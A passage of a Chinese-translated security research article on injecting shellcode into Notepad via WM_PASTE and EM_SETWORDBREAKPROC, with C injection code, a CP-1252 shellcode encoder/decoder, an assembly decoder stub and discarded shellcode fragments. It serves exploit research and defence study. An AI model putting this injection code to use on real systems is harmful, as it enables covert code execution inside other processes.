        PBYTE  cs;
    
        char   buf[1024];
    
        // get window handle for notepad class
        npw = FindWindow("Notepad", NULL);
    
        // get window handle for edit control
        ecw = FindWindowEx(npw, NULL, "Edit", NULL);
    
        // get the EM handle for the edit control
        emh.p = (PVOID)SendMessage(ecw, EM_GETHANDLE, 0, 0);
    
        // get the process id for the window
        GetWindowThreadProcessId(ecw, &pid);
    
        // open the process for reading and changing memory permissions
        hp = OpenProcess(PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
    
        // copy some test data to the clipboard
        memset(buf, 0x4d, sizeof(buf));
        CopyToClipboard(CF_TEXT, buf, sizeof(buf));    
    
        // loop until target buffer address is stable
        lastbuf.p = NULL;
        r = FALSE;
    
        for(;;) {
          // read the address of input buffer     
          ReadProcessMemory(hp, emh.p, 
            &embuf.p, sizeof(ULONG_PTR), &rd);
    
          // Address hasn't changed? exit loop
          if(embuf.p == lastbuf.p) {
            r = TRUE;
            break;
          }
          // save this address
          lastbuf.p = embuf.p;
    
          // clear the contents of edit control
          SendMessage(ecw, EM_SETSEL, 0, -1);
          SendMessage(ecw, WM_CLEAR, 0, 0);
    
          // send the WM_PASTE message to the edit control
          // allow notepad some time to read the data from clipboard
          SendMessage(ecw, WM_PASTE, 0, 0);
          Sleep(WAIT_TIME);
        }
    
        if(r) {
          // set buffer to RWX
          VirtualProtectEx(hp, embuf.p, 4096, PAGE_EXECUTE_READWRITE, &old);
    
          // generate shellcode and copy to clipboard
          cs = cp1252_generate_winexec(pid, &cslen);
          CopyToClipboard(CF_TEXT, cs, cslen);
    
          // clear buffer and inject shellcode
          SendMessage(ecw, EM_SETSEL, 0, -1);
          SendMessage(ecw, WM_CLEAR, 0, 0);
          SendMessage(ecw, WM_PASTE, 0, 0);
          Sleep(WAIT_TIME);
    
          // set the word break procedure to address of shellcode and execute
          SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)embuf.p);
          SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
          SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
    
          // set buffer to RW
          VirtualProtectEx(hp, embuf.p, 4096, PAGE_READWRITE, &old);
        }
        CloseHandle(hp);
        return r;
    }
    

## 0x05 演示

记事本不会因为运行Shellcode而崩溃。在线程结束后，演示程序将会终止它。  
演示视频：<https://videopress.com/v/wyrPJIZZ>

## 0x06 编码任意数据

编码数据和代码需要不同的解决方案。针对无法执行的原始数据，需要从中删除“错误的字符”，代码必须在转换之后能成功执行，这一点在实际中很难实现。下面的编码和解码算法，都是基于有关删除Shellcode中的空字符的先前研究。

###  6.1 编码

1、从输入文件或流中读取一个字节，然后分配给X；  
2、如果允许X+1，跳转到步骤6；  
3、将转义码（0x01）保存到输出文件或流中；  
4、使用8位密钥与X进行异或；  
5、将X保存到输输出文件或流，跳转到步骤7；  
6、将X+1保存到输出文件或流；  
7、重复步骤1-6，直到EOF。

    
    
    // encode raw data to CP-1252 compatible data
    static
    void cp1252_encode(FILE *in, FILE *out) {
        uint8_t c, t;
    
        for(;;) {
          // read byte
          c = getc(in);
          // end of file? exit
          if(feof(in)) break;
          // if the result of c + 1 is disallowed
          if(!is_decoder_allowed(c + 1)) {
            // write escape code
            putc(0x01, out);
            // save byte XOR'd with the 8-Bit key
            putc(c ^ CP1252_KEY, out);
          } else {
            // save byte plus 1
            putc(c + 1, out);
          }
        }
    }
    

###  6.2 解码

1、从输入文件或流中读取一个字节，然后分配给X；  
2、如果X不是转义码，跳转到步骤6；  
3、从输入文件或流中读取一个字节，然后分配给X；  
4、使用8位密钥与X进行异或；  
5、将X保存到输出文件或流，跳转到步骤7；  
6、将X-1保存到输出文件或流；  
7、重复步骤1-6，直到EOF。

    
    
    // decode data processed with cp1252_encode to their original values
    static
    void cp1252_decode(FILE *in, FILE *out) {
        uint8_t c, t;
    
        for(;;) {
          // read byte
          c = getc(in);
          // end of file? exit
          if(feof(in)) break;
          // if this is an escape code
          if(c == 0x01) {
            // read next byte
            c = getc(in);
            // XOR the 8-Bit key
            putc(c ^ CP1252_KEY, out);
          } else {
            // save byte minus one
            putc(c - 1, out);
          }
        }
    }
    

该程序集与x86架构的32位和64位模式兼容。

    
    
    ; cp1252 decoder in 40 bytes of x86/amd64 assembly
    ; presumes to be executing in RWX memory
    ; needs stack allocation if executing from RX memory
    ;
    ; odzhan
    
        bits 32
    
        %define CP1252_KEY 0x4D
    
        jmp    init_decode       ; read the program counter
    
        ; esi = source
        ; edi = destination 
        ; ecx = length
    decode_bytes:
        lodsb                    ; read a byte
        dec    al                ; c - 1
        jnz    save_byte
        lodsb                    ; skip null byte
        lodsb                    ; read next byte
        xor    al, CP1252_KEY    ; c ^= CP1252_KEY
    save_byte:
        stosb                    ; save in buffer
        lodsb                    ; skip null byte
        loop   decode_bytes
        ret
    load_data:
        pop    esi               ; esi = start of data
        ; ********************** ; decode the 32-bit length
    read_len:
        push   0                 ; len = 0
        push   esp               ; 
        pop    edi               ; edi = &len
        push   4                 ; 32-bits
        pop    ecx
        call   decode_bytes
        pop    ecx               ; ecx = len
    
        ; ********************** ; decode remainder of data
        push   esi               ; 
        pop    edi               ; edi = encoded data
        push   esi               ; save address for RET
        jmp    decode_bytes
    init_decode:
        call   load_data
        ; CP1252 encoded data goes here..
    

解码器可以存储在缓冲区的开头，而回调可以存储在内存的更高位置。

## 0x07 进一步研究

下面列出了相关的论文和演讲资料。如果大家发现有未列出的Unicode Shellcode相关优秀文章，欢迎随时通过电子邮件与我取得联系。  
[1] Chris Anley – 在Unicode扩展字符串中创建任意Shellcode  
<https://www.nccgroup.com/uk/our-research/creating-arbitrary-shellcode-in-unicode-expanded-strings/>  
[2] Chris/Kristin Paget – 利用Win32 API中的设计缺陷进行特权升级  
<https://web.archive.org/web/20060904080018/http://security.tombom.co.uk/shatter.html>  
[3] Chris/Kristin Paget – Shatter attacks的更多技巧与细节  
<https://web.archive.org/web/20060830211709/http://security.tombom.co.uk/moreshatter.html>  
[4] Chris/Kristin Paget – 关于Shatter attacks的漏洞利用与信息  
<https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-paget.pdf>  
[5] obscou – 构建IA32“Unicode-Proof”Shellcode  
<http://phrack.org/issues/61/11.html>  
[6] Dave Aitel – 漏洞利用剖析：陷入困境应该怎么做  
<https://www.blackhat.com/presentations/win-usa-03/bh-win-03-aitel/bh-win-03-aitel.pdf>  
[7] Oliver Lavery – Win32消息漏洞  
<https://web.archive.org/web/20030917194127/http://www.idefense.com/idpapers/Shatter_Redux.pdf>  
[8] Phenoelit/FX – 实用Win32和UNICODE漏洞利用  
<https://www.blackhat.com/presentations/win-usa-04/bh-win-04-fx.pdf>  
[9] Brett Moore – Shatter的例子  
<https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-moore/bh-us-04-moore-whitepaper.pdf>  
[10] Thomas Wana – 编写兼容UTF-8的Shellcode  
<http://phrack.org/issues/62/9.html>  
[11] Unicode Shellcode及改进  
<http://bigsonata.com/resources/unicode_shellcode_2008.pdf>  
[12] 漏洞利用编写教程第7部分：Unicode，从0x00410041到calc  
<https://www.corelan.be/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/>

## 0x08 代码回收站

以下是一些我们考虑过，但最后没有使用的代码。在这里，我们提供了为什么将其丢弃的说明。  
最开始的尝试是将EAX设置为0，将AL和AH设置为0，然后使用CWDE将AX扩展为EAX。但遗憾的是，0x98无法使用。

    
    
    "xb0x00"     /* mov  al, 0             */
    "x00x4dx00" /* add  byte [ebp], cl    */
    "xb4x00"     /* mov  ah, 0             */
    "x00x4dx00" /* add  byte [ebp], cl    */
    "x98"         /* cwde                   */
    

将EAX设置为0的另一个想法。使用CLC清除进位标志，将EAX设置为0xFF00FF00。从EAX减去0xFF00FF00 +
CF，这会导致将EAX设置为0。这里的问题在于，ADD会影响“进位标志”，这就是它之所以无法按预期工作的原因。当然，也可能会起作用，具体取决于RBP指向什么，以及CL的值是什么。

    
    
    "xf8"                 /* clc                       */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "xb8x00xffx00xff" /* mov   eax, 0xff00ff00     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "x1dx00xffx00xff" /* sbb   eax, 0xff00ff00     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    

这个想法是将EAX设置为-1。首先，使用STC设置进位标志，将EAX设置为0xFF00FF00。从EAX减去0xFF00FF00 +
CF，这会将EAX设置为0xFFFFFFFF。出现了与以前一样的问题。

    
    
    "xf9"                 /* stc                       */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "xb8x00xffx00xff" /* mov   eax, 0xff00ff00     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "x1dx00xffx00xff" /* sbb   eax, 0xff00ff00     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    

这个想法是将EAX设置为1。首先，将EAX设置为0，设置进位标志（CF），然后使用随进位（ADC）将CF与AL相加。这里会出现与以前一样的问题。

    
    
    "x6ax00"             /* push  0                     */
    "x58"                 /* pop   rax                   */
    "x00x4dx00"         /* add   byte [rbp], cl        */
    "xf9"                 /* stc                         */
    "x00x4dx00"         /* add   byte [rbp], cl        */
    "x14x00"             /* adc   al, 0                 */
    

将EAX设置为-1的另一个版本。将0存储在堆栈中，将地址加载到RAX中，然后加1。向左旋转31位以得到0x80000000。加载到EAX中，并使用CDQ将EDX设置为-1，然后交换EAX和EDX。问题在于，0x99转换为双字节编码。

    
    
    "x6ax00"     /* push 0                 */
    "x54"         /* push rsp               */
    "x00x4dx00" /* add  byte [rbp], cl    */
    "x58"         /* pop  rax               */
    "x00x4dx00" /* add  byte [rbp], cl    */
    "xffx00"     /* inc  dword [rax]       */
    "x00x4dx00" /* add  byte [rbp], cl    */
    "xc1x00x1f" /* rol  dword [rax], 0x1f */
    "x00x4dx00" /* add  byte [rbp], cl    */
    "x58"         /* pop  rax               */
    "x00x4dx00" /* add  byte [rbp], cl    */
    "x99"         /* cdq                    */
    "x00x4dx00" /* add  byte [rbp], cl    */
    "x92"         /* xchg eax, edx          */
    

我研究了各种模拟指令的方法，最终发现只能使用自修改的代码才能有用。将布尔逻辑与按位指令（AND/XOR/OR/NOT）与某些算数运算符（NEG/ADD/SUB）一起使用，以选择应该继续执行代码的地址。RET指令是唯一可以用于转移执行的操作码。没有可直接使用的JMP、Jcc或CALL指令。  
如果我们必须修改代码以模拟布尔逻辑，那么只将指令写入到内存并在其中执行就变得更有意义了。

    
    
    "x39xd8"             /* cmp   eax, ebx           */
    

在这里，没有与CP-1252兼容的用于CMP或SUB寄存器的简单组合。我们可以将EAX与立即值进行比较，但无法再与其他值进行比较了。以下使用CMPSD的代码尝试比较EAX
< EBX，产生的结果为0（FALSE）或-1（TRUE）。除了SBB之前的ADD指令生成错误结果之外，其他都可以正常工作。

    
    
    "x50"                 /* push  rax                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "x54"                 /* push  rsp                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "x5e"                 /* pop   rsi                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "x53"                 /* push  rbx                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "x54"                 /* push  rsp                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "x5f"                 /* pop   rdi                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "xa7"                 /* cmpsd                        */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "x6ax00"             /* push  0                      */
    "x58"                 /* pop   rax                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "x1cx00"             /* sbb   al, 0                  */
    "x50"                 /* push  rax                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "x54"                 /* push  rsp                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "x58"                 /* pop   rax                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "xc1x00x18"         /* rol   dword ptr [rax], 0x18  */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "x58"                 /* pop   rax                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "x6ax00"             /* push  0                      */
    "x54"                 /* push  rsp                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "x5f"                 /* pop   rdi                    */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "xaa"                 /* stosb                        */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "xaa"                 /* stosb                        */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "xaa"                 /* stosb                        */
    "x00x4dx00"         /* add   byte [rbp], cl         */
    "xaa"                 /* stosb                        */
    

将0xFF000700加载到EAX中。使用SAHF设置进位标志（CF）。然后使用SBB减去0xFF000700 +
CF，这会将EAX设置为-1或0xFFFFFFFF。

    
    
    "xb8x00x07x00xff" /* mov   eax, 0xff000700    */
    "x00x4dx00"         /* add   byte [rbp], cl     */
    "x9e"                 /* sahf                     */
    "x00x4dx00"         /* add   byte [rbp], cl     */
    "x1dx00x07x00xff" /* sbb   eax, 0xff000700    */
    "x00x4dx00"         /* add   byte [rbp], cl     */
    

这里有两个问题：SAHF是我们不能使用的字节（0x9E），即使可以使用，SAHF指令修改标志寄存器后的ADD也会导致EAX设置为0或-1。结果取决于存储在地址rbp中包含的字节和CL的值。  
加-1将从包含其地址的变量EAX中减去1。

    
    
    "x6ax00"             /* push  0                    */
    "x54"                 /* push  rsp                  */
    "x00x4dx00"         /* add   byte [rbp], cl       */
    "x58"                 /* pop   rax                  */
    "x00x4dx00"         /* add   byte [rbp], cl       */
    "x83x00xff"         /* add   dword  [eax], -1  */
    "x58"                 /* pop   rax                  */
    "x00x4dx00"         /* add   byte [rbp], cl       */
    

效果很好，但是由于0x83转换为双字节编码，因此我们无法使用它。  
用STC设置进位标志（CF）。使用`SBB AL,
0`，将AL设置为0xFF。在堆栈上创建一个设置为0的变量。将该变量的地址加载到rdi中。在加载到RAX之前，将AL存储到变量四次。在STC执行之后的加法无效。

    
    
    "xf9"                 /* stc                       */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "x1cx00"             /* sbb   al, 0               */
    "x6ax00"             /* push  0                   */
    "x54"                 /* push  rsp                 */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "x5f"                 /* pop   rdi                 */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "xaa"                 /* stosb                     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "xaa"                 /* stosb                     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "xaa"                 /* stosb                     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "xaa"                 /* stosb                     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "x58"                 /* pop   rax                 */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    

下一个代码段仅将RCX的值复制到RAX。它过于复杂，在某些情况下，`POP QWORD`指令可能会有用，我们觉得它并不是那么实用。

    
    
    "x6ax00"             /* push  0              */
    "x54"                 /* push  rsp            */
    "x00x4dx00"         /* add   byte [rbp], cl */
    "x58"                 /* pop   rax            */
    "x00x4dx00"         /* add   byte [rbp], cl */
    "x51"                 /* push  rcx            */
    "x00x4dx00"         /* add   byte [rbp], cl */
    "x8fx00"             /* pop   qword [rax]    */
    "x00x4dx00"         /* add   byte [rbp], cl */
    "x5f"                 /* pop   rax            */
    

添加寄存器是一个问题，特别是在进位发生的时候。对32位寄存器进行的任何操作都会自动清除64位寄存器的较高32位，因此要对地址进行加减运算，并不能对32位寄存器执行ADD和SUB。

    
    
        push   0
        pop    rcx
        xnop
        push   rbp              ; save rbp      
        xnop
        ; 1. ====================================
        push   0                ; store 0 as X
        push   rsp              ; store &X
        xnop
        pop    rbp              ; load &X
        xnop
        ; 2. ====================================
        mov    eax, 0xFF001200  ; load 0xFF001200
        add    [rbp], ah        ; add 0x12
        adc    al, 0            ; AL = CF
        push   rbp              ; store &X
        xnop
        push   rsp              ; store &&X
        xnop
        pop    rax              ; load &&X
        xnop
        inc    dword[rax]       ; &X++
        pop    rbp
        xnop
        add    [rbp], al        ; add CF
        ; 3. ====================================
    

最后，可能有用也可能没用的工具。假设我们已经拥有Shellcode，并且想要在执行之前在内存重建它。如果表1的地址在RAX中，表2的地址在RSI中，R8为0，那么下一条指令可能会有用。Shellcode的每个偶数字节都将存储在一个表中，而每个奇数字节存储在另一个表中。然后在运行时，我们将两个表结合起来。唯一的问题就是将R8设为0，因为使用它的任何地方都需要REX前缀。如果R8已经为0，这个思路将非常可行。

    
    
        ; read byte from table 2
        lodsb
        add [rbp], cl
        add byte[rax+r8+1], al   ; copy to table 1
        add [rbp], cl
    
        lodsb
        add [rbp], cl
        add byte[rax+r8+3], al
        add [rbp], cl
    
        lodsb
        add [rbp], cl
        add byte[rax+r8+5], al
        add [rbp], cl
    
        ; and so on..
    
        ; execute
        push rax
        ret
    

使用以上指令将8位添加到32位字中。

    
    
        ; step 1
        push   rax              ; save pointer
        add    byte[rbp], cl
        add    byte[rax+r8], bl ; A[0] += B[0]
        mov    al, 0
        adc    al, 0            ; set carry
        add    byte[rbp], cl
        push   rax              ; save carry
        add    byte[rbp], cl
        pop    rcx              ; load carry into CL
        add    byte[rbp], cl
        pop    rax              ; restore pointer
        add    byte[rbp], cl
    
        ; step 2
        push   rax              ; save pointer
        add    byte[rbp], cl
        rol    dword[rax], 24   
        add    byte[rbp], cl
        add    byte[rax+r8], cl ; A[1] += CF
        mov    al, 0
        adc    al, 0            ; set carry
        add    byte[rbp], cl
        push   rax              ; save carry
        add    byte[rbp], cl
        pop    rcx              ; load carry into CL
        add    byte[rbp], cl
        pop    rax              ; restore pointer
        add    byte[rbp], cl
    
        ; step 3
        push   rax              ; save pointer
        add    byte[rbp], cl
        rol    dword[rax], 24    
        add    byte[rbp], cl
        add    byte[rax+r8], cl ; A[2] += CF
        mov    al, 0
        adc    al, 0            ; set carry
        add    byte[rbp], cl
        push   rax              ; save carry
        add    byte[rbp], cl
        pop    rcx              ; load carry into CL
        add    byte[rbp], cl
        pop    rax              ; restore pointer
        add    byte[rbp], cl
    
        ; step 4
        push   rax              ; save pointer
        add    byte[rbp], cl
        rol    dword[rax], 24    
        add    byte[rbp], cl
        add    byte[rax+r8], cl ; A[3] += CF
        mov    al, 0
        adc    al, 0            ; set carry
        add    byte[rbp], cl
        push   rax              ; save carry
        add    byte[rbp], cl
        pop    rcx              ; load carry into CL
        add    byte[rbp], cl
        pop    rax              ; restore pointer
        add    byte[rbp], cl
    
        ; step 5
        rol    dword[rax], 24
        add    byte[rbp], cl
    

如我们所见，尝试模拟指令并不仅仅是将代码写入内存中，并且以这种方式执行会非常麻烦。

本文翻译自modexp.wordpress.com [原文链接](https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **P!chu** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/210281](/post/id/210281)

安全客 - 有思想的安全新媒体

本文转载自: [modexp.wordpress.com](https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/)

如若转载,请注明出处： <https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [系统安全](/tag/系统安全)

 **+1** __0赞

 __收藏

![](https://p3.ssl.qhimg.com/t01bd1dba67fe13cdc6.png) P!chu

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

